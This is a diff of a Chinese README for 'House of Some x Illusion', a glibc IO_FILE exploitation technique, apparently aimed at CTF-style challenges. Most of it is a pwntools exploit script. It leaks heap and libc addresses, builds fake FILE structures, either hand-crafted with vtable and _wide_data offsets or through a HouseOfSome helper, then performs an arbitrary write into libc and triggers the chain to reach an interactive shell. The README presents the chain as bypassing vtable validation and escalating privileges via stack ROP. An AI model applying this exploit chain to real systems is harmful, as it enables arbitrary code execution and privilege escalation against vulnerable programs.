@@ -1,4 +1,4 @@
-# House of Some
+# House of Some x Illusion
 
 一种新的IO_FILE利用思路，利用条件为
 
@@ -9,12 +9,16 @@
 
 House of some具有以下优点：
 
-1. 无视目前的`IO_validate_vtable`检查（wide_data的vtable加上检查也可以打）
+1. 无视目前的`IO_validate_vtable`检查（wide_data的vtable加上检查也可以使用）
 2. 第一次任意地址写要求低
 3. 最后攻击提权是栈上ROP，可以不需要栈迁移
 4. 源码级攻击，不依赖编译结果
 
-详细思路见https://blog.csome.cc/p/house-of-some/
+详细思路见
+
+House of Some: https://blog.csome.cc/p/house-of-some/
+
+House of Illusion: https://enllus1on.github.io/2024/01/22/new-read-write-primitive-in-glibc-2-38/#more
 
 ## 自动化
 
@@ -72,44 +76,19 @@ log.success(f"heap_addr: {heap_addr:#x}")
 libc_base = printf_addr - libc.symbols["printf"]
 log.success(f"libc_base: {libc_base:#x}")
 
-_IO_file_jumps_addr = libc_base + 0x216600
-
-fake_wide_data = flat({
-    0xE0: _IO_file_jumps_addr - 0x48,
-    0x18: 0,
-    0x20: 1,
-}, filler=b"\x00")
-
-fake_file_read = flat({
-    0x00: 0, # _flags
-    0xc0: 2, # _mode
-    0x70: 0, # _fileno
-    0x28: 0, # _IO_write_ptr
-    0x20: 0, # _IO_write_base
-    0x82: 0, # _vtable_offset
-    
-    0x38: heap_addr + 0xe0 + 0xe8, # _IO_buf_base
-    0x40: heap_addr + 0xe0 + 0xe8 + 0x400, # _IO_buf_end
-
-    0xa0: heap_addr + 0xe0, # _wide_data
-    0xd8: libc_base + 0x2160C0, # vtable
-
-    0x68: heap_addr + 0xe0 + 0xe8, # _chain next file
-}, filler=b"\x00")
-
-payload = flat({
-    0x00: fake_file_read,
-    0xe0: fake_wide_data
-})
-# 构造第一个任意地址写的fake file
+libc.address = libc_base
+fake_file_start = heap_addr + 0xe0 + 0xe8
+# 上方是信息收集
+# ------------------------------------------------- # 
+hos = HouseOfSome(libc=libc, controled_addr=fake_file_start)
+# 构造第一个任意地址写原语
+payload = hos.hoi_read_file_template(fake_file_start, 0x400, fake_file_start, 0)
 io.sendlineafter(b"content> ", payload)
 write(libc_base + 0x21a680, 8, p64(heap_addr))
 leave() # exit
 
-libc.address = libc_base
-fake_file_start = heap_addr + 0xe0 + 0xe8
-hos = HouseOfSome(libc=libc, controled_addr=fake_file_start)
-hos.bomb(io, libc.symbols['_IO_file_underflow'] + 390)
+io_flush_all = libc.address + 0x8ea42 # Ubuntu GLIBC 2.35-0ubuntu3.1
+hos.bomb(io, io_flush_all) # 一句话攻击
 
 io.interactive()
 ```
